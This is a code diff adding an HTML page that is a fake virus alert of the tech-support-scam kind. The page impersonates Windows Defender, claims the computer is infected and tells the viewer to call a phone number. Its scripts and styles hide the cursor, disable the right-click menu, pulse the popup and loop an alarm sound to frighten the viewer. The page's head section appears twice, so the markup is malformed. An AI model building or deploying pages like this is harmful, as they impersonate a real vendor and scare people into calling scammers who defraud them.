@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dangerous malware detected on your computer!</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #0177d7;
+            cursor: none; /* Hides the cursor */
+        }
+
+        .popup-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 40px;
+            border-radius: 17px;
+            animation: pulse 2s infinite;
+        }
+
+        .icon {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .icon img {
+            width: 40px;
+            height: 40px;
+            margin-right: 10px;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dangerous malware detected on your computer!</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #0177d7;
+            cursor: none; /* Hides the cursor */
+        }
+
+        .popup-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 40px;
+            border-radius: 17px;
+            animation: pulse 2s infinite;
+        }
+
+        .icon {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .icon img {
+            width: 40px;
+            height: 40px;
+            margin-right: 10px;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="popup-container">
+        <div class="icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Windows_Defender_logo.svg/1950px-Windows_Defender_logo.svg.png" alt="MALWARE DETECTED">
+            <h1>Dangerous virus detected!</h1>
+        </div>
+        <p>Your computer has been infected with Worm:Win64/Java!bin</p>
+        <p>Please call the following number immediately to remove the malware:</p>
+        <p class="phone-number">669-552-551</p>
+    </div>
+
+    <script>
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+        });
+
+        var audio = new Audio('bleep.mp3'); // Replace with the correct path to your audio file
+        audio.loop = true;
+        audio.play();
+    </script>
+</body>
+</html>
